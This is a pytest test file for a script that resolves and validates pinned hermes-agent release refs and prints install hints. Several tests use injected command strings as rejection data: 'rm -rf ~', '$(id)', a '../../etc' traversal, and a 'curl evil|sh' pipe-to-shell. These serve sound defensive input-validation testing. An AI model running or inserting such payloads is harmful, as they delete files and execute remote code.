"""scripts/hermes_pin.py: one channel-keyed hook for the hermes-agent ref (bleeding default)."""
import json, os, sys, types
import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "scripts"))
import hermes_pin as hp


class _ChErr(ValueError): pass
class _ResErr(RuntimeError): pass


def fake_channel(ref="v9.9.9", fail=None):
    """Stand-in with the release-channel API: effective(), resolve(), ChannelError, ResolveError."""
    m = types.SimpleNamespace(ChannelError=_ChErr, ResolveError=_ResErr, calls=[])
    def effective(channel=None, days=None, environ=None):
        env = os.environ if environ is None else environ
        c = channel or env.get("FAMILIA_CHANNEL") or "bleeding"
        if c not in ("bleeding", "stable"): raise _ChErr("invalid channel %r" % c)
        return c, int(days or env.get("FAMILIA_STABLE_DAYS") or 30)
    def resolve(source_id, channel=None, days=None, **kw):
        m.calls.append((source_id, channel, days))
        if fail: raise fail
        return types.SimpleNamespace(ref=ref, fallback=False, reason="fake", published_at="2026-11-02T00:00:00Z")
    m.effective, m.resolve = effective, resolve
    return m


def test_pin_file_has_both_channels_and_python():
    pins = hp.load_pins()
    assert set(pins["channels"]) == {"bleeding", "stable"}
    for e in pins["channels"].values():
        assert len(e["commit"]) == 40 and e["ref"].startswith("v")
    assert pins["python"] == "3.14"


def test_default_is_bleeding_pin_without_channel_py():
    r = hp.resolve_ref(environ={}, chmod=None)
    assert r["channel"] == "bleeding" and r["source"] == "pin-file"
    assert r["ref"] == hp.load_pins()["channels"]["bleeding"]["ref"]


def test_stable_pin_selected_by_channel_env_without_channel_py():
    r = hp.resolve_ref(environ={"FAMILIA_CHANNEL": "stable", "FAMILIA_STABLE_DAYS": "7"}, chmod=None)
    assert r["channel"] == "stable" and r["days"] == 7
    assert r["ref"] == hp.load_pins()["channels"]["stable"]["ref"]


def test_invalid_channel_is_an_error_not_a_default():
    with pytest.raises(hp.PinError):
        hp.resolve_ref(environ={"FAMILIA_CHANNEL": "nightly"}, chmod=None)
    with pytest.raises(hp.PinError):
        hp.resolve_ref(environ={"FAMILIA_CHANNEL": "nightly"}, chmod=fake_channel())


def test_channel_py_is_asked_for_hermes_agent_source():
    m = fake_channel(ref="v0.22.6")
    r = hp.resolve_ref("stable", 14, environ={}, chmod=m)
    assert m.calls == [("hermes-agent", "stable", 14)]
    assert r["source"] == "channel.py" and r["ref"] == "v0.22.6"
    assert r["commit"] == hp.load_pins()["channels"]["bleeding"]["commit"]  # known ref -> commit attached


def test_unknown_ref_from_channel_py_has_no_commit():
    r = hp.resolve_ref(environ={}, chmod=fake_channel(ref="v99.0.0"))
    assert r["ref"] == "v99.0.0" and r["commit"] is None


def test_network_failure_falls_back_to_the_channels_pin():
    r = hp.resolve_ref("stable", environ={}, chmod=fake_channel(fail=_ResErr("offline")))
    assert r["fallback"] is True and r["source"] == "pin-file"
    assert r["ref"] == hp.load_pins()["channels"]["stable"]["ref"]


def test_offline_never_calls_channel_py():
    m = fake_channel()
    r = hp.resolve_ref(environ={}, chmod=m, offline=True)
    assert m.calls == [] and r["source"] == "pin-file"


def test_invalid_ref_from_channel_py_rejected():
    with pytest.raises(hp.PinError):
        hp.resolve_ref(environ={}, chmod=fake_channel(ref="../../etc"))


def test_installed_version_parses_full_cli_banner():
    out = "Hermes Agent v0.22.6 (2026.9.24) · stable · local f0d94882e89a\nInstall method: git\n"
    run = lambda *a, **k: types.SimpleNamespace(stdout=out, stderr="", returncode=0)
    ver, commit = hp.installed_version("/x/hermes", run=run)
    assert (ver, commit) == ("v0.22.6", "f0d94882e89a")
    want = hp.load_pins()["channels"]["bleeding"]
    assert hp.matches(want, ver, commit)
    assert not hp.matches(hp.load_pins()["channels"]["stable"], ver, commit)


def test_real_channel_py_api_when_present():
    """When Release Driver's scripts/channel.py is in the tree, the hook must speak its API."""
    m = hp.channel_module()
    if m is None:
        pytest.skip("scripts/channel.py not in this tree")
    assert m.effective(None, None, {}) == ("bleeding", 30)
    assert "hermes-agent" in m.SOURCES
    r = hp.resolve_ref(environ={}, offline=True)
    assert r["channel"] == "bleeding"


def test_cli_resolve_offline_prints_ref(capsys):
    assert hp.main(["resolve", "--offline", "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert out["ref"] and out["channel"] in ("bleeding", "stable")


def test_install_hint_uses_upstream_installer_commit():
    want = hp.load_pins()["channels"]["stable"]
    h = hp.install_hint(want, "/home/u/.local/bin/hermes")
    assert "install.sh" in h and "--commit " + want["commit"] in h
    assert "snap" in hp.install_hint(want, "/snap/bin/hermes-agent")
    assert "ls-remote" in hp.install_hint({"ref": "v99.0.0", "commit": None})


# --- Boundary fix-forwards (a) (b) (d) -------------------------------------------------------------

def _pins(tmp_path, chans, **top):
    p = tmp_path / "pins.json"
    p.write_text(json.dumps(dict({"python": "3.14", "channels": chans}, **top)))
    return str(p)


GOOD = {"bleeding": {"ref": "v1.2.3", "commit": "a" * 40}, "stable": {"ref": "v1.2.2", "commit": "b" * 40}}


@pytest.mark.parametrize("commit", ["abc123", "A" * 40, "a" * 39 + "; rm -rf ~", "$(id)", 40, "a" * 41])
def test_commit_must_be_40_lower_hex(tmp_path, commit):
    chans = json.loads(json.dumps(GOOD)); chans["stable"]["commit"] = commit
    with pytest.raises(hp.PinError, match="40 lowercase hex"):
        hp.load_pins(_pins(tmp_path, chans))


def test_commit_may_be_absent(tmp_path):
    chans = json.loads(json.dumps(GOOD)); del chans["stable"]["commit"]
    assert hp.load_pins(_pins(tmp_path, chans))["channels"]["stable"].get("commit") is None


def test_malformed_json_is_a_pin_error_not_a_traceback(tmp_path, monkeypatch, capsys):
    p = tmp_path / "pins.json"; p.write_text("{not json")
    with pytest.raises(hp.PinError, match="not valid JSON"):
        hp.load_pins(str(p))
    monkeypatch.setattr(hp, "PINS", str(p))
    monkeypatch.setattr(hp.load_pins, "__defaults__", (str(p),))
    assert hp.main(["resolve", "--offline"]) == 2
    err = capsys.readouterr().err
    assert "not valid JSON" in err and "Traceback" not in err


def test_unreadable_and_wrong_shape(tmp_path):
    with pytest.raises(hp.PinError, match="cannot read"):
        hp.load_pins(str(tmp_path / "absent.json"))
    p = tmp_path / "list.json"; p.write_text("[]")
    with pytest.raises(hp.PinError, match="no channels"):
        hp.load_pins(str(p))


def test_missing_stable_entry_is_an_error_not_bleeding(tmp_path):
    with pytest.raises(hp.PinError, match="no stable entry"):
        hp.load_pins(_pins(tmp_path, {"bleeding": GOOD["bleeding"]}))
    pins = {"python": "3.14", "channels": {"bleeding": GOOD["bleeding"]}}
    with pytest.raises(hp.PinError, match="no stable entry"):
        hp.resolve_ref("stable", environ={}, pins=pins, chmod=None)


def test_install_hint_fetches_install_sh_from_the_pinned_commit():
    want = {"ref": "v1.2.3", "commit": "c" * 40}
    h = hp.install_hint(want, "/home/u/.local/bin/hermes")
    assert "raw.githubusercontent.com/NousResearch/hermes-agent/%s/scripts/install.sh" % ("c" * 40) in h
    assert "hermes-agent.nousresearch.com/install.sh" not in h
    assert "nousresearch.com/install.sh" not in hp.install_hint({"ref": "v1.2.3", "commit": None})


def test_install_hint_never_prints_an_unvalidated_commit():
    h = hp.install_hint({"ref": "v1.2.3", "commit": "deadbeef; curl evil|sh"}, "/home/u/.local/bin/hermes")
    assert "evil" not in h and "ls-remote" in h


def test_install_hint_downloads_then_runs():
    import re
    for want in ({"ref": "v1.2.3", "commit": "c" * 40}, {"ref": "v1.2.3", "commit": None}):
        h = hp.install_hint(want, "/home/u/.local/bin/hermes")
        assert not re.search(r"\|\s*(ba)?sh\b", h), h
        assert "curl -fsSLo hermes-install.sh " in h and "&& bash hermes-install.sh --commit " in h
